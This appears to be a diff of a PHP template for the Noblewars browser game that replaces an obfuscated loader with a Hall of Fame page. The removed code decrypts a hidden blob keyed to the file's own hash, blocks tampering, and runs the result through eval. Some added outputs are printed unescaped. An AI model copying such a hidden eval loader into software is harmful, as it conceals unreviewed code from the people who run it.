@@ -1,24 +1,203 @@
 <?php
-$mvtyqyzll="80486fad4305637698d2fce8a9266cc4";
-$kzbwyzdiwws="0c51560c0252555d510b540350005403095d5c005400505a595b010354020702";
-$xiwdrtd="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";
-$nuhfvcmcqdl=file_get_contents(__FILE__);
-$xmhmhe=str_replace($xiwdrtd,"",$nuhfvcmcqdl);
-if(strpos($xmhmhe,"ec"."ho")!==false||strpos($xmhmhe,"pr"."int")!==false||strpos($xmhmhe,"var_"."dump")!==false||strpos($xmhmhe,"file_put_"."contents")!==false||strpos($xmhmhe,"fw"."rite")!==false){die();}
-$msmhtsciq=str_replace(array($mvtyqyzll,$kzbwyzdiwws),array("SP_d31ae8ee","KP_7dc78d9a"),$nuhfvcmcqdl);
-$adzqtawgu=md5($msmhtsciq);
-$uvpsuouvh=hex2bin($kzbwyzdiwws);
-$zvqhdcnpd="";
-$ymcgzmsbu=strlen($adzqtawgu);
-for($ifywstk=0;$ifywstk<$ymcgzmsbu;$ifywstk++){
-$zvqhdcnpd.=chr(ord($uvpsuouvh[$ifywstk])^ord($adzqtawgu[$ifywstk]));
-}
-$mqlljzd=base64_decode($xiwdrtd);
-$mdrvkmrgbt=strlen($mqlljzd);
-$tupnxmevo="";
-$ocdyrhajog=strlen($zvqhdcnpd);
-for($ifywstk=0;$ifywstk<$mdrvkmrgbt;$ifywstk++){
-$tupnxmevo.=$mqlljzd[$ifywstk]^$zvqhdcnpd[$ifywstk%$ocdyrhajog];
-}
-$rrlvdojg="gzun"."compress";
-eval('?>' . $rrlvdojg($tupnxmevo) . '<?php ');
+// Dynamic data passed from HallOfFameScreen controller
+$world = $world ?? '1';
+$worlds_list = $worlds_list ?? [];
+?>
+<!DOCTYPE html>
+<html>
+
+<head>
+    <title>Noblewars - Regras do Jogo</title>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <link rel="stylesheet" type="text/css" href="css/index.css" />
+    <link rel="stylesheet" type="text/css" href="css/hall_of_fame.css" />
+    <link rel="stylesheet" type="text/css" href="css/hof_fixes.css" />
+    <link rel="shortcut icon" href="graphic/icons/nwfavicon.ico" />
+</head>
+
+<body class="no-paladin" id="hof">
+    <div id="index_body">
+        <div id="main">
+            <br>
+
+            <div id="header">
+                <h1>
+                    <a href="index.php" style="background:url(graphic/index/bg-noble2.jpg) no-repeat 100% 0;">
+                        <p style="position: absolute; top: -200px">Noblewars</p>
+                    </a>
+                </h1>
+
+                <div class="navigation">
+                    <div class="navigation-holder">
+                        <div class="navigation-wrapper">
+                            <div id="navigation_span">
+                                <a href="index.php"><?= __('screens.hall_of_fame.home') ?></a> -
+                                <a href="rules.php"><?= __('screens.hall_of_fame.rules') ?></a> -
+                                <a href="team.php"><?= __('screens.hall_of_fame.team') ?></a> -
+                                <a href="hall_of_fame.php">Hall da Fama</a> -
+                                <a href="help.php">Ajuda</a>
+
+                                <!-- Language Selector -->
+                                <span style="float: right; margin-right: 10px;">
+                                    <?php include __DIR__ . '/../../Views/components/language_selector.php'; ?>
+                                </span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- inicio do conteudo-->
+
+            <div id="content" align="center">
+                <div class="content box-border red">
+                    <div class="top-left"></div>
+                    <div class="top-right"></div>
+                    <div class="middle-top"></div>
+                    <div class="middle-bottom"></div>
+                    <div class="middle"></div>
+                    <div class="middle-left"></div>
+                    <div class="middle-right"></div>
+                    <div class="bottom-left"></div>
+                    <div class="bottom-right"></div>
+
+                    <div class="inner">
+                        <div class="paladin"></div>
+                        <div class="full-content">
+                            <h2><?= __('screens.hall_of_fame.title', ['world' => htmlspecialchars($world)]) ?></h2>
+                            <p><?= __('screens.hall_of_fame.select_world') ?>:</p>
+                            <!-- World Selection Sidebar - Right -->
+                            <aside class="pull-right">
+                                <div class="content-selector">
+                                    <h3>Selecionar mundo</h3>
+                                    <ul>
+                                        <?php foreach ($worlds_list as $w): ?>
+                                            <li class="<?= $world == $w['id'] ? 'active' : 'inactive' ?> <?= !empty($w['is_closed']) ? 'closed-world' : '' ?>">
+                                                <a href="hall_of_fame.php?world=<?= $w['id'] ?>">
+                                                    <?= $w['name'] ?>
+                                                </a>
+                                            </li>
+                                        <?php endforeach; ?>
+                                    </ul>
+                                </div>
+                            </aside>
+
+                            <!-- Top Players -->
+                            <div class="bordered-box hof-sidebar">
+                                <h3><?= __('screens.hall_of_fame.top_players') ?></h3>
+                                <div class="bordered-box-content">
+                                    <div class="placements">
+                                        <?php if (!empty($top_players)): ?>
+                                            <?php foreach ($top_players as $index => $player): ?>
+                                                <div class="placement place<?= $index + 1 ?>">
+                                                    <a href="guest.php?world=<?= htmlspecialchars($world) ?>&screen=info_player&id=<?= $player['id'] ?>"><?= htmlspecialchars($player['username']) ?></a>
+                                                </div>
+                                            <?php endforeach; ?>
+                                        <?php else: ?>
+                                            <p><?= __('screens.hall_of_fame.no_data') ?></p>
+                                        <?php endif; ?>
+                                    </div>
+                                </div>
+                            </div>
+
+                            <!-- Top Tribes -->
+                            <div class="bordered-box hof-sidebar">
+                                <h3><?= __('screens.hall_of_fame.top_tribes') ?></h3>
+                                <div class="bordered-box-content">
+                                    <div class="placements">
+                                        <?php if (!empty($top_tribe)): ?>
+                                            <div class="placement place1">
+                                                <a href="guest.php?world=<?= htmlspecialchars($world) ?>&screen=info_ally&id=<?= $top_tribe['id'] ?>"><?= htmlspecialchars($top_tribe['tag']) ?></a>
+                                            </div>
+                                        <?php else: ?>
+                                            <p><?= __('screens.hall_of_fame.no_data') ?></p>
+                                        <?php endif; ?>
+                                    </div>
+                                    <h4 align='left'><?= __('screens.hall_of_fame.members') ?>:</h4>
+                                    <div class="hof-tribe-members-list"
+                                        style="margin-top: 10px; color: #3e2723; font-size: 11px; text-align: center; padding: 0 20px;">
+                                        <?= !empty($top_tribe['members']) ? htmlspecialchars($top_tribe['members']) : '-' ?>
+                                    </div>
+                                </div>
+                            </div>
+                            <?php foreach ($achievements as $category => $catData): ?>
+                                <div class="bordered-box hof-sidebar">
+                                    <h3>
+                                        <?= htmlspecialchars($catData['title']) ?>
+                                    </h3>
+                                    <div class="bordered-box-content">
+                                        <?php foreach ($catData['items'] as $ach): ?>
+                                            <div class="milestone-group">
+                                                <div class="award level4">
+                                                    <img src="<?= $ach['image'] ?>" alt="" class="content-box-image">
+                                                </div>
+                                                <p> <?= htmlspecialchars($ach['label']) ?><br> 
+                                                    <strong><?= htmlspecialchars($ach['winner']) ?></strong>
+                                                </p>
+                                            </div>
+                                        <?php endforeach; ?>
+                                    </div>
+                                </div>
+                            <?php endforeach; ?>
+                            <!-- <div class="bordered-box hof-fullwidth"> -->
+                            <div class="bordered-box hof-sidebar">
+                                <h3>Metas diárias</h3>
+                                <div class="bordered-box-content">
+                                    <?php if (!empty($daily_awards)): ?>
+                                        <?php foreach ($daily_awards as $ach): ?>
+                                            <div class="milestone-group">
+                                                <div class="award level4">
+                                                    <img src="<?= $ach['image'] ?>" alt="" class="content-box-image">
+                                                </div>
+                                                <p> <?= htmlspecialchars($ach['name']) ?><br> 
+                                                    <strong><?= htmlspecialchars($ach['winner']) ?></strong>
+                                                </p>
+                                            </div>
+                                        <?php endforeach; ?>
+                                    <?php endif; ?>
+                                </div>
+                            </div>
+
+                        </div>
+                        <div class="award-group-foot">&nbsp;</div>
+                    </div>
+
+                </div>
+            </div>
+        </div>
+    </div>
+    </div>
+
+    <div class="closure">
+        &copy; <?= date('Y') ?> by ice41 - NobleWars
+    </div>
+    </div>
+    </div>
+
+    <script>
+        function toggleRule(id) {
+            const content = document.getElementById('rule-content-' + id);
+            const header = content.previousElementSibling;
+
+            if (content.classList.contains('collapsed')) {
+                content.classList.remove('collapsed');
+                header.classList.remove('collapsed');
+            } else {
+                content.classList.add('collapsed');
+                header.classList.add('collapsed');
+            }
+        }
+
+        // Collapse all sections by default except the first one
+        document.addEventListener('DOMContentLoaded', function () {
+            const contents = document.querySelectorAll('.rule-content');
+            contents.forEach(function (content, index) {
+                if (index > 0) { // Keep first section open
+                    content.classList.add('collapsed');
+                    content.previousElementSibling.classList.add('collapsed');
+                }
+            });
+        });
+    </script>
+</body>
+
+</html>
